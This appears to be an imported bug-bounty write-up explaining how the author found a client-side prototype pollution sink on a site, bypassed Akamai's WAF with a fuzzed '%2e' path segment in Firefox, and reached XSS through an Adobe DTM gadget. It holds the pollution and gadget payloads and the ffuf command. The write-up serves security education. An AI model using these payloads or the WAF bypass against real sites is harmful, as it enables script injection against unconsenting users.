---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-06-03_prototype-pollution-akamai.md
original_filename: 2023-06-03_prototype-pollution-akamai.md
title: Prototype Pollution Akamai
category: documents
detected_topics:
- jwt
- xss
- command-injection
- mobile-security
- supply-chain
tags:
- imported
- documents
- jwt
- xss
- command-injection
- mobile-security
- supply-chain
language: en
raw_sha256: 3559060a59611b32b2005b4eb0bf0a6b8ee5ec7afe6dfe7f5b6d5da155cb07f5
text_sha256: bbcbdb6ea20a1be1d4561acfb752d8640ac6fc998e75f0c1f52999fb2bdf0960
ingested_at: '2026-06-28T07:32:21Z'
sensitivity: unknown
redactions_applied: false
---

# Prototype Pollution Akamai

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-06-03_prototype-pollution-akamai.md
- Source Type: markdown
- Detected Topics: jwt, xss, command-injection, mobile-security, supply-chain
- Ingested At: 2026-06-28T07:32:21Z
- Redactions Applied: False
- Raw SHA256: `3559060a59611b32b2005b4eb0bf0a6b8ee5ec7afe6dfe7f5b6d5da155cb07f5`
- Text SHA256: `bbcbdb6ea20a1be1d4561acfb752d8640ac6fc998e75f0c1f52999fb2bdf0960`


## Content

---
title: "Prototype Pollution Akamai"
page_title: "BB-Writeups/2023/prototype-pollution-akamai.md at main · Sudistark/BB-Writeups · GitHub"
url: "https://github.com/Sudistark/BB-Writeups/blob/main/2023/prototype-pollution-akamai.md"
final_url: "https://github.com/Sudistark/BB-Writeups/blob/main/2023/prototype-pollution-akamai.md"
authors: ["Sudhanshu Rajbhar (@sudhanshur705)"]
bugs: ["Client-side prototype pollution", "WAF bypass"]
publication_date: "2023-06-03"
added_date: "2023-06-05"
source: "pentester.land/writeups.json"
original_index: 1091
---

A couple of weeks back Max posted a tweet regarding prototype pollution (pp) where he had trouble with Akamai WAF and couldn't exploit pp coz of the waf. He was happy to collaborate , split the bounty so I spent much time in bypassing this and at first it looked almost impossible I somehow managed to bypass it in the end.

As nothing of this worked I was curios myself what was the issue and I haven't found any prototype pollution bugs in real websites so it would be fun I thought.

[![chrome_F3WCZkQHV9](https://private-user-images.githubusercontent.com/31372554/243064107-d56d44cc-46b4-40e6-b930-a75efae2c2e2.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3ODI2MjI0MTUsIm5iZiI6MTc4MjYyMjExNSwicGF0aCI6Ii8zMTM3MjU1NC8yNDMwNjQxMDctZDU2ZDQ0Y2MtNDZiNC00MGU2LWI5MzAtYTc1ZWZhZTJjMmUyLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNjA2MjglMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjYwNjI4VDA0NDgzNVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWQ4NjIxZjcxNWYyMGY1MDk2ZDliYTlmYWYxNGU5NWI1NDdjNzliM2M0YjU3OTVjNmUzYjE5M2MzOTIzMTllNDAmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0JnJlc3BvbnNlLWNvbnRlbnQtdHlwZT1pbWFnZSUyRnBuZyJ9.heTZo0sXJ-Zo9U5nUazYjUvfkKXISxY2bVw5kZpvakU)](https://private-user-images.githubusercontent.com/31372554/243064107-d56d44cc-46b4-40e6-b930-a75efae2c2e2.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3ODI2MjI0MTUsIm5iZiI6MTc4MjYyMjExNSwicGF0aCI6Ii8zMTM3MjU1NC8yNDMwNjQxMDctZDU2ZDQ0Y2MtNDZiNC00MGU2LWI5MzAtYTc1ZWZhZTJjMmUyLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNjA2MjglMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjYwNjI4VDA0NDgzNVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWQ4NjIxZjcxNWYyMGY1MDk2ZDliYTlmYWYxNGU5NWI1NDdjNzliM2M0YjU3OTVjNmUzYjE5M2MzOTIzMTllNDAmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0JnJlc3BvbnNlLWNvbnRlbnQtdHlwZT1pbWFnZSUyRnBuZyJ9.heTZo0sXJ-Zo9U5nUazYjUvfkKXISxY2bVw5kZpvakU)

Max shared the site so I first started with checking which vulnerable library was responsible for this in order to identify the sink

Soon enough identified the sink:
  
  
  $(document).ready(function() {
  var e = getSearchOrHashBased(location.href); [1]
  if (e && !jQuery.isEmptyObject(e)) {
  var n = getJsonFromUrl(e);
  
  
  function getJsonFromUrl(e) {
  var n = {};
  return e.split("&").forEach(function(e) {
  if (e) {
  var t = (e = e.split("+").join(" ")).indexOf("=")
  , a = t > -1 ? e.substr(0, t) : e
  , i = t > -1 ? decodeURIComponent(e.substr(t + 1)) : ""
  , o = a.indexOf("[");
  if (-1 == o)
  n[decodeURIComponent(a)] = i;
  else {
  var s = a.indexOf("]", o)
  , r = decodeURIComponent(a.substring(o + 1, s));
  a = decodeURIComponent(a.substring(0, o)),
  n[a] || (n[a] = []),
  r ? n[a][r] = i : n[a].push(i) // prototype pollution here [2]
  }
  }
  }),
  n
  }

The method name says it all `getJsonFromUrl` , it converts query parameters to a json object
  
  
  /?sudi=shirley will be converted to 
  
  {"sudi":"shirley"}

As the above method doesn't performs any check againsts the key before performing the operation on line [2], this code is vulnerable to prototype pollution.

From this snyk advisory: <https://security.snyk.io/vuln/SNYK-JS-LITESPEEDJS-2359250> you can find more details
  
  
  PoC
  add the following query string ?__proto__[polluted]=yes
  
  open the browser developer console. The property polluted has value yes
  

But it wasn't as simple as what was mentioned in the POC as Akamai WAF was doing a good job here.

* * *

The source is `location.href` , on line [1] you can see that it calls `getSearchOrHashBased` method which extracts the query parameter from the url including hash fragment part.
  
  
  function getSearchOrHashBased(e) {
  e || (e = location.href);
  var n = e.indexOf("?")
  , t = e.indexOf("#");
  return -1 == t && -1 == n ? {} : (-1 == t && (t = e.length),
  -1 == n || t == n + 1 ? e.substring(t) : e.substring(n + 1, t))
  }

This method is used to extract params either from the search or hash parameters from a URL.If there is # in the url and no ? , the hash parameters will be passed on and search params will be ignored.

Bypassing Akamai looked very easy at first ,as seeing source if from fragment part which will not be sent to the server and hence the WAF wouldn't trigger.

But just coz of one silly mistake it didn't worked. Can you figure it out what might be the problem? Use your Sharingan and take a good look at the code again (just kiding :p)

The developer forgot to remove the `#` part from the parameters
  
  
  >getSearchOrHashBased("https://example.com/?sudi=shirley")
  'sudi=shirley'
  >getSearchOrHashBased("https://example.com/#sudi=shirley")
  '#sudi=shirley'

Just because of a silly mistake , this was passed as a key instead of just the parameter name `#sudi`.So upon using `#__proto__[x]=x` wouldn't worke as
  
  
  n["#__proto__"]["x"] = "x" // #__proto__ is undefined
  
  
  >n = {}
  {}
  
  >n["#__proto__"]["x"] = "x"
  VM54:1 Uncaught TypeError: Cannot set properties of undefined (setting 'x')
  at <anonymous>:1:22
  (anonymous) @ VM54:1
  
  >n["__proto__"]["x"] = "x"
  'x'
  
  >n.__proto__
  {x: 'x', constructor: ƒ, __defineGetter__: ƒ, __defineSetter__: ƒ, hasOwnProperty: ƒ, …}

As `#` part failed we need to rely on the query params itself.

We can try using `contructor.prototype` property instead of `__proto__`
  
  
  x = {}
  {}
  x.__proto__
  {constructor: ƒ, __defineGetter__: ƒ, __defineSetter__: ƒ, hasOwnProperty: ƒ, __lookupGetter__: ƒ, …}
  x.constructor.prototype
  {constructor: ƒ, __defineGetter__: ƒ, __defineSetter__: ƒ, hasOwnProperty: ƒ, __lookupGetter__: ƒ, …}
  x.constructor.prototype === x.__proto__
  true

But this is not useful in our case as the code doesn't iterates over all the properties recursively and also Akamai blocks the constructor keyword when used inside of `[constructor]`

The legend Gareth himself also pointed out some solutions so I tried them too:

<https://twitter.com/garethheyes/status/1657837036030554115>

  1. constructor.prototype

As the dot notation isn't supported in our case I used this instead `constructor[prototype][polluted]` But as already pointed out `[prototype]` was blocked by Akamai

  2. _Try url encoding square brackets or using the hash instead of the query string. Other than that you’d probably need to use the existing code to bypass the WAF_

Url encoded (double url encode also) square brackets were still blocked by Akamai

In addition I also tried url encoding `__proto__` and the property which is place inside square brackets as in the `getJsonFromUrl` method you can see `decodeURIComponent` is used.

And already mentioned hash instead of query string isn't an option coz of a silly mistake from developer's side.

  3. _Oh I forgot obvious stuff like whitespace between brackets etc. JS supports all sorts of whitespace_

To explain this here's an example, javaScript is a whitespace-insensitive programming language, which means that it largely ignores whitespace characters like spaces, tabs, and line breaks:
  
  
  Object.__proto__.x = 1337
  1337
  Object.__proto__.x
  1337
  Object.__proto__. x
  1337
  Object.__proto__ . x
  1337
  Object. __proto__ . x
  1337
  Object.  __proto__ . x

But still this was also blocked by Akamai

Some more solutions which I suggested myself: <https://twitter.com/sudhanshur705/status/1657753816241147904>

* * *

**Analyzing the WAF**

<https://www.target.com/?__proto>__ -> allowed [https://www.target.com/?__proto__[]=x](https://www.target.com/?__proto__%5B%5D=x) -> allowed [https://www.target.com/?__proto__[x]=x](https://www.target.com/?__proto__%5Bx%5D=x) -> blocked [https://www.target.com/?__proto__[1]=x](https://www.target.com/?__proto__%5B1%5D=x) -> blocked

I spent almost a whole day and it seemed impossible to bypass, as there are only very limited variations I could do in case prototype pollution. In case of xss you have a no of tags,etc to try but here the options are limited.

So I started fuzzing query params adding some url encoded stuff which might break the WAF

Jub0bs recently posted a writeuop about a beautiful chain of bugs <https://jub0bs.com/posts/2023-05-05-smorgasbord-of-a-bug-chain/>

Where he was able to bypass Akamai, by removing the `?` from the url and using `&` instead.

[![image](https://private-user-images.githubusercontent.com/31372554/243064185-a34b0177-e763-4368-9b7c-85c3f6045959.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3ODI2MjI0MTUsIm5iZiI6MTc4MjYyMjExNSwicGF0aCI6Ii8zMTM3MjU1NC8yNDMwNjQxODUtYTM0YjAxNzctZTc2My00MzY4LTliN2MtODVjM2Y2MDQ1OTU5LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNjA2MjglMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjYwNjI4VDA0NDgzNVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWQ4YjE4ZDczZTRkOTBhODhiYjBmN2U4NWY1MmZhODA1ODRmNmZmMWMyYjE0ZjJiZDBiNjc4MTkyOGI5ZmE2MzkmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0JnJlc3BvbnNlLWNvbnRlbnQtdHlwZT1pbWFnZSUyRnBuZyJ9.xd4I9JIkfRyGgahpggzWGPk2G9Pr353YQDdDva-Op94)](https://private-user-images.githubusercontent.com/31372554/243064185-a34b0177-e763-4368-9b7c-85c3f6045959.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3ODI2MjI0MTUsIm5iZiI6MTc4MjYyMjExNSwicGF0aCI6Ii8zMTM3MjU1NC8yNDMwNjQxODUtYTM0YjAxNzctZTc2My00MzY4LTliN2MtODVjM2Y2MDQ1OTU5LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNjA2MjglMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjYwNjI4VDA0NDgzNVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWQ4YjE4ZDczZTRkOTBhODhiYjBmN2U4NWY1MmZhODA1ODRmNmZmMWMyYjE0ZjJiZDBiNjc4MTkyOGI5ZmE2MzkmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0JnJlc3BvbnNlLWNvbnRlbnQtdHlwZT1pbWFnZSUyRnBuZyJ9.xd4I9JIkfRyGgahpggzWGPk2G9Pr353YQDdDva-Op94)

I tried the same thing but it didn't worked, so I though there might be more similar ways to bypass Akamai waf. SO I fuzzed different portions of the url

Like this:
  
  
  https://www.target.com/?__proto__[FUZZx]=x
  https://www.target.com/?__proto__[x]FUZZ=x
  https://www.target.com/?__proto__[FUZZx]=x
  https://www.target.com/?FUZZ__proto__[x]=x
  https://www.target.com/FUZZ?__proto__[x]=x
  

I used this wordlist: <https://gist.github.com/Sudistark/d3e5f9e5dcad77c7e6560cb4b5ad66c8> , which contaions a list of url encoded characters.

The results were suprising one of them actually worked and returned 200 ok. Can you guess which url it was from the above 5 ?
  
  
  ffuf -w urlencoded.txt -u "https://www.target.com/FUZZ?__proto__[x]=x"
  
  
  %2e  [Status: 200, Size: 26150, Words: 4216, Lines: 558, Duration: 2532ms]

Ahhh that's `.`

But when I tried opening this url in my chrome browser: [https://www.target.com/%2e?__proto__[x]=x](https://www.target.com/%2e?__proto__%5Bx%5D=x) The dot was automatically removed (consumed), which is normal behaviour I guess as browsers as you might have seen browsers normalizes ../ also.

Then I remebered that Firefox is the exception here as it doesn't consumes the url encoded `.` and it still stays there. So I again opened the same url now in firefox and this time it worked and also bypassed Akamai WAF.I checked the console to confirm if prototype pollution is working or not
  
  
  >x = {}
  Object {  }
  
  >x.__proto__
  Object { x: "x", … }
  
  >x.x
  "x" 

And yeah here we finally managed to bypass Akamai :)

Now comes finding the prototype pollution gagdet part, DomInvader has an inbuilt gagdet scanner.As I already saw some 3rd prty libraries like Adobe Dynamic Tag Management were in use in that page. I just picked up the gadget from here: <https://github.com/BlackFan/client-side-prototype-pollution>

<https://github.com/BlackFan/client-side-prototype-pollution/blob/master/gadgets/adobe-dtm.md>
  
  
  ?__proto__[src]=data:,alert(1)//
  

Here's the screenshot of the alert popup

[![firefox_cgm1PDt65D](https://private-user-images.githubusercontent.com/31372554/243064064-9d1ff684-95ce-4017-897a-2a68576945e5.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3ODI2MjI0MTUsIm5iZiI6MTc4MjYyMjExNSwicGF0aCI6Ii8zMTM3MjU1NC8yNDMwNjQwNjQtOWQxZmY2ODQtOTVjZS00MDE3LTg5N2EtMmE2ODU3Njk0NWU1LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNjA2MjglMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjYwNjI4VDA0NDgzNVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWYyNTBkZTJlMWUzMmQyZGUwNzk0YjdlYzUwMzY2NzM0ODgxOTU0YTkzNTk0ZDE1OThlZDVjNzljY2I2ZTRmZjAmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0JnJlc3BvbnNlLWNvbnRlbnQtdHlwZT1pbWFnZSUyRnBuZyJ9.K20LIoAmelJwso8dJHYyE91G2kDkGqX2MtwLdLy3TnM)](https://private-user-images.githubusercontent.com/31372554/243064064-9d1ff684-95ce-4017-897a-2a68576945e5.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3ODI2MjI0MTUsIm5iZiI6MTc4MjYyMjExNSwicGF0aCI6Ii8zMTM3MjU1NC8yNDMwNjQwNjQtOWQxZmY2ODQtOTVjZS00MDE3LTg5N2EtMmE2ODU3Njk0NWU1LnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNjA2MjglMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjYwNjI4VDA0NDgzNVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWYyNTBkZTJlMWUzMmQyZGUwNzk0YjdlYzUwMzY2NzM0ODgxOTU0YTkzNTk0ZDE1OThlZDVjNzljY2I2ZTRmZjAmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0JnJlc3BvbnNlLWNvbnRlbnQtdHlwZT1pbWFnZSUyRnBuZyJ9.K20LIoAmelJwso8dJHYyE91G2kDkGqX2MtwLdLy3TnM)
